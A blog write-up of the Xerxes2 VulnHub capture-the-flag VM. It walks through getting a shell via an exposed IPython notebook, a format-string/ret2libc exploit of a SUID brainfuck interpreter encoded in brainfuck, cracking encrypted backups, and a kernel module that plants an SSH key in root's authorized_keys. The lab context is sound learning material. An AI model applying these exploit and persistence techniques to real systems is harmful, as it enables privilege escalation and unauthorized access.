<p>Xerxes2 is a successor in a boot2root series by <a href="https://twitter.com/barrebas">@barrebas</a> hosted by <a href="https://twitter.com/vulnhub">@VulnHub</a>. If you haven&rsquo;t done it yet, close this article <em>now</em> and go learn by doing it!</p>

<p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>

<p></p>

<h2 id="getting-started">getting started</h2>

<p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>

<pre><code class="language-bash">root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-09 17:14 SAST

</code></pre>

<p>Well this gives us a boat load to test out already!</p>

<p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>

<pre><code class="language-bash">root@kali:~#  nc 192.168.56.102 4444 | tee nc-string

</code></pre>

<p><code>nc-data</code> is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.</p>

<p><em>(Electronic Noises &amp; Robot Voice)</em> <em>This is Xerxes. Why do you persist in your loneliness?</em> <em>(Electronic Noises)</em></p>

<p>The start and end of the voice message had a clear in &amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.</p>

<p>This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.</p>

<p>Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&rsquo;t have to.</p>

<h2 id="first-shell-access">first shell access</h2>

<p>Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:</p>


<figure>
    
        <img src="https://leonjza.github.io/images/xerxesII_home.png" />
    
    
</figure>


<p>However, moving on to tcp/8888, we see it identified as <code>Tornado httpd 2.3</code>. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!</p>

<p>tcp/8888 hosted a <a href="http://ipython.org/notebook.html">IPython Notebook</a>. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a <code>!</code>. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the <code>delacroix</code> user:</p>

        <img src="https://leonjza.github.io/images/xerxesII_ipython.png" />

<p>And then a easy SSH in:</p>

<pre><code class="language-bash">root@kali:~# ssh -i delacroix delacroix@192.168.56.102

<h2 id="becoming-polito-the-why">becoming polito - the why</h2>

<p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>

<p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ ls -lh

LOOK DEEPERdelacroix@xerxes2:~$
</code></pre>

<p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href="http://en.wikipedia.org/wiki/Brainfuck">brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>

<h3 id="inspecting-bf-c">inspecting bf.c</h3>

<p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>

<pre><code class="language-c">case '.':
    printf(&quot;%c&quot;, buf[datapointer]);
    break;
case ',':
    buf[datapointer] = getchar();
    break;
case '&gt;':
    datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
    break;
case '&lt;':
    datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
    break;
case '+':
    buf[datapointer]++;
    break;
case '-':
    buf[datapointer]--;

</code></pre>

<p>Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as <code>,.</code>, and run it with <code>/opt/bf</code>, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 <code>+</code>, and ran that with a brainfk interpreter like <code>/opt/bf</code>, then you would have the character with ASCII value 62 in memory. You can then print that value with <code>.</code>, or move on the next memory cell with a <code>&lt;</code>. The most important thing to learn about brainfk was, <em>there are no high level features. No file IO, no socket IO, nothing</em>.</p>

<p>That was our brainfk class for the day.</p>

<h3 id="finding-the-bf-vuln">finding the bf vuln</h3>

<p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>

<pre><code class="language-c">case '#':
    // new feature
    printf(buf);
    break;
</code></pre>

<p>Classic format string vulnerability!</p>

<p>As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to <em>somehow</em> exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as <code>polito</code>.</p>

<h2 id="becoming-polito-the-how">becoming polito - the how</h2>

<p>Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:</p>

<ul>
<li>print <code>AAAA%x%x%x%x</code>, adding <code>%s</code> until you see the hex for of A (41), meaning that you are trying to find the position in the stack that <code>printf</code> is placing the arguments.</li>
<li>Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of <code>AAAA%16$x</code>.</li>
<li><code>objdump -R /your/bin</code> and find a call in the GOT to override.</li>
<li>Place some shellcode as environment variable, ie: <code>EGG</code>, prefixed with say 200 <code>0x90</code>.</li>
<li>use <code>gdb</code>, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.</li>
<li>Calculate the required padding of strings to get the correct memory address, and write it using the <code>%n</code> format string.</li>
<li>Profit?</li>
</ul>

<p>While this is all fine and dandy, it was not possible for me to <em>profit</em> with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. <code>/opt/bf</code> was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D</p>

<p>So, let me take this step by step on how <code>/opt/bf</code> can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.</p>

<h3 id="opt-bf-part1">/opt/bf - part1</h3>

<p>To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:</p>

<ul>
<li><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></li>
<li><a href="http://codearcana.com/posts/2013/04/28/picoctf-videos.html">http://codearcana.com/posts/2013/04/28/picoctf-videos.html</a></li>
<li><a href="http://youtu.be/NwzmYSlETI8">http://youtu.be/NwzmYSlETI8</a></li>
<li><a href="http://youtu.be/CHrs30g-3O0">http://youtu.be/CHrs30g-3O0</a></li>
</ul>

<p>So, lets work with this.</p>

<p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>&gt;</code>, preparing for the next character.</p>

<p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ echo $(python -c 'print &quot;+&quot; * ord(&quot;a&quot;)')
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
delacroix@xerxes2:~$ /opt/bf &quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&quot;
a
</code></pre>

<p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ /opt/bf &quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&quot;
aa
</code></pre>

<p>2 <code>a</code>&rsquo;s! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href="https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions">list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>

<pre><code class="language-python">print &quot;&gt;&quot;.join([&quot;+&quot; * ord(x) for x in (&quot;the quick brown fox&quot;)])
</code></pre>

<p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>

<p>Anyways, that settled the brainfk problem.</p>

<h3 id="opt-bf-part2">/opt/bf - part2</h3>

<p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ /opt/bf &quot;$(python -c 'print &quot;&gt;&quot;.join([&quot;+&quot; * ord(x) for x in (&quot;AAAA&quot; + &quot;.%x&quot; * 20 + &quot;\n&quot;)])')#&quot;
AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
</code></pre>

<p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ /opt/bf &quot;$(python -c 'print &quot;&gt;&quot;.join([&quot;+&quot; * ord(x) for x in (&quot;AAAA&quot; + &quot;.%16$x&quot; &quot;\n&quot;)])')#&quot;
AAAA.41414141
</code></pre>

<p>Yup! Parameter 16 gives us what we need :)</p>

<p>Great. Were making progress&hellip; I think.</p>

<p>For the sake of time, I am not going to document the 412643932471236 attempts that were made at getting this to work. Instead, here is the path that did eventually work. This is the part of Xerxes2 that undoubtedly took me the longest to get right.</p>

<h3 id="opt-bf-part3">/opt/bf - part3</h3>

<p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>

<p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
</code></pre>

<p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&gt;  (0xb7734000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000)
    /lib/ld-linux.so.2 (0xb7735000)
delacroix@xerxes2:~$ ldd /opt/bf
    linux-gate.so.1 =&gt;  (0xb779b000)
    libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7630000)
    /lib/ld-linux.so.2 (0xb779c000)
delacroix@xerxes2:~$ ldd /opt/bf

    libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7655000)
    /lib/ld-linux.so.2 (0xb77c1000)
delacroix@xerxes2:~$
</code></pre>

<p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>

<pre><code class="language-bash">delacroix@xerxes2:~$ ulimit -s unlimited

<p>The memory locations are now static :) With that done, lets have a look at what pointer we would like to override, and then where we should be overwriting it to. We first take a look at the Global Offset Table:</p>

<p>Here, we will choose to override the <code>printf</code> functions pointer. This is at 0x08049a48. So, this address will have the location of our <em>evil code</em>. But now, how do we know where the evil code is and <em>what</em> is it? Again, this was another interesting thing that had me researching for a very long time. In the end, it came to light that there is such a thing as <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">ret2libc</a>. The basic idea here is that we override the pointer for <code>printf</code> to <code>system</code> with a argument. I highly recommend you read <a href="http://protostar-solutions.googlecode.com/hg/Stack%206/ret2libc.pdf">this pdf</a> for a proper explanation on what exactly this means.</p>

<p>The only thing that is left to determine is where <code>system</code> is in memory. Luckily this is also pretty easy to find out. Fire up <code>gdb</code>, run the binary and <code>print system</code> to get the address:</p>

<pre><code class="language-bash">delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.
(gdb) run

(gdb) print system

(gdb)
</code></pre>

<p>Soooo, 0x40062000. We have the point in memory where <code>system()</code> lives, and we know where the program is going to go to lookup the <code>printf</code> function. All that is left now is to exploit the format string vulnerability, override the location of <code>printf</code> with <code>system</code>, and provide a new argument for the now fooled <code>printf</code> to run. A new argument can be given by simply providing another <code>#</code> (remember we have the source so that was easy to figure out).</p>

<h3 id="opt-bf-part4">/opt/bf - part4</h3>

<p>We have all the information we need, lets get to work.</p>

<p>We fire up <code>gdb</code>, and instead of printing the location of <code>AAAA</code>, we provide a memory address, with a <code>%n</code> format string so that we can write the amount of bites needed to override the pointer location.</p>

<p>To aid in getting the exact amount of padding right, we will set a breakpoint just before the application finished so that we can examine the pointer 0x08049a48 from the GOT:</p>

<p>Oooooooooooh. So basically 0x8049a48 now says <code>printf</code> lives at 0x00000004. Not entirely true though, but we will fix this. Fixing this is quite easy too. Using some python again, we can calculate the amount of bytes we must write to get the memory location we want. We know we want to write to <code>system</code>, that lives in memory at 0x40062000. We will split the calculation up into 2 parts, and first write the 0x2000, and then the 0x4006. We can see that we have written 4 bytes already, so to calculate the first part, we will simply subtract 4 from 0x2000 and pad parameter 16 with the amount.</p>

<p>You will see some whitespace output as a result of the <code>%8188u</code>, but inspecting the pointer from GOT reveals that we have the lower part of the memory now set correctly (0x00002000)! :) The upper part of the address is calculated in a similar way, however, we are going to be moving on 2 places in memory to write this value and provide another format string. This means that our lower part of the memory will change as a result, and we will need to compensate for that when we calculate the upper part.</p>

<p>As you can see, we have moved up 4 bytes on the lower part of the address, so we can simply take 4 off 8188 to fix that. To determine the upper part of the address though, we will do another hex calculation and remove the amount that we have from the amount that we want:</p>

<p>w00t. We have rewritten the GOT for <code>printf</code> to the location of the libc <code>system</code> call using the format string vulnerability. Phew.</p>

<p>Now, all that is left is to get the <code>printf</code> to rerun (using the <code>#</code>) with a payload such as <code>/bin/sh</code>. We will append the <code>/bin/sh</code> to the end and just add another <code>#</code> to call <code>printf</code> (which is now overridden):</p>

<p>Oly. Crap. That. Was. Awesome. :D :D</p>

<p>We have just exploited a format string vulnerability on a binary that has the NX bit set, encoded with brainfk using ret2libc.</p>

<h2 id="becoming-korenchkin">becoming korenchkin</h2>

<p>We just got a shell with a euid for <code>polito</code>. To make life easier, I copied the public key I generated earlier for the first shell into <code>polito</code>&rsquo;s home, and SSH&rsquo;d in as that user.</p>

<p>At first glance, it appeared as if we have a gpg encrypted <code>dump</code> and a pdf. There was also a cronjob to start a netcat server piping a text file out via tcp/4444 (remember the mp3 form earlier? :D)</p>

<p>That is all the PDF had. The QR code resolves to &ldquo;XERXES is watching&hellip;&rdquo;. I tried to highlight all of the text in the PDF to maybe reveal a piece of text that was white in color, but nothing apparent came out. The next step was to run the PDF through the <code>file</code> utility.</p>

<p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>

<pre><code class="language-bash">root@kali:~# head -c 512 polito.pdf &gt; first
root@kali:~# file -k first
first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo(s) (1146103071 records)

root@kali:~# tail -c +512 polito.pdf &gt; second
root@kali:~# file second
second: Dyalog APL
root@kali:~#
</code></pre>

<p>Opening <code>first</code> in a PDF viewer gave a blank PDF, and <code>second</code> gave the PDF we saw originally with <code>polito.pdf</code>. <code>first</code> was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the <a href="http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout">structure</a> etc. Eventually it was time to take a break and come back with a fresh look at this.</p>

<p>I came back with some new ideas. One of them being that I should quickly create a VM, attach <code>first</code> as a disk and try run it and see what the output would be. VirtualBox did not like the file format of <code>first</code> :( Next I resorted to using <code>qemu</code>. And success!</p>

        <img src="https://leonjza.github.io/images/xerxesII_qemu_boot.png" />

<p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>

<pre><code class="language-bash">polito@xerxes2:~$ gpg -d dump.gpg &gt; decrypted_dump
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected

polito@xerxes2:~$ file decrypted_dump
decrypted_dump: data

polito@xerxes2:~$ ls -lh decrypted_dump
-rw-r--r-- 1 polito polito 126M Aug 10 02:12 decrypted_dump
</code></pre>

<p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>

<p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>

<pre><code class="language-bash">polito@xerxes2:~$ grep $(ls /opt/backup/) decrypted_strings
korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
polito@xerxes2:~$
</code></pre>

<p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>

<pre><code class="language-bash">polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar

polito@xerxes2:~$ file korenchkin.tar
korenchkin.tar: POSIX tar archive (GNU)

polito@xerxes2:~$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~$
</code></pre>

<p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>

<pre><code class="language-bash">root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102

You have new mail.

</code></pre>

<p><em>You have new mail.</em></p>

<h2 id="becoming-root">becoming root</h2>

<p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>

<pre><code class="language-bash">korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
</code></pre>

<p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>

<p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>

<pre><code class="language-c">#include &lt;linux/module.h&gt;       /* Needed by all modules */
#include &lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */
#include &lt;linux/init.h&gt;         /* Needed for the macros */

static int __init hello_start(void)
{
    printk(KERN_INFO &quot;Loading hello module...\n&quot;);
    return 0;
}

static void __exit hello_end(void)
{
    printk(KERN_INFO &quot;Goodbye Mr.\n&quot;);
}

module_init(hello_start);
module_exit(hello_end);
</code></pre>

<pre><code class="language-make">obj-m += hello.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
</code></pre>

<p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>

<pre><code class="language-bash">korenchkin@xerxes2:~/kern$ make

<p>Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? <code>#include &lt;stdio.h&gt;</code>, and <code>system()</code> some commands to run <code>stuff</code>, getting me a <code>/tmp/getroot</code> prepared.</p>

<p><em>insert loud crash and burn sound here</em></p>

<p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>

<p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href="http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage">this</a> amongst other pieces of information helped get the ball rolling.</p>

<pre><code class="language-bash">#include &lt;linux/module.h&gt;       /* Needed by all modules */
#include &lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */
#include &lt;linux/init.h&gt;         /* Needed for the macros */

/* For our shell ^_^ */
#include&lt;linux/kmod.h&gt;

int get_root (void)
{

    char * envp[] = { &quot;HOME=/&quot;, NULL };
    char *argv[] = { &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;/bin/cat /tmp/pubkey &gt;&gt; /root/.ssh/authorized_keys&quot;, NULL};
    printk(KERN_INFO &quot;Call Usermodehelper...\n&quot;);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO &quot;Done usermodehelper...\n&quot;);
    return 0;
}

static int __init hello_start(void)
{
    printk(KERN_INFO &quot;Loading rooted module...\n&quot;);
    return get_root();
    return 0;
}

static void __exit hello_end(void)
{
    printk(KERN_INFO &quot;Goodbye Mr.\n&quot;);
}

module_init(hello_start);
module_exit(hello_end);
</code></pre>

<p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>

    congratulations on beating xerxes2!

    I hope you enjoyed it as much as I did making xerxes2.
    xerxes1 has been described as 'weird' and 'left-field'
    and I hope that this one fits that description too :)

    Many thanks to @TheColonial &amp; @rasta_mouse for testing!

    Ping me on #vulnhub for thoughts and comments!

<p>Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks <a href="https://twitter.com/barrebas">@barrebas</a> and <a href="https://twitter.com/VulnHub">@VulnHub</a> for another great learning opportunity.</p>

<p>Now, the next step? OSCP :)</p>
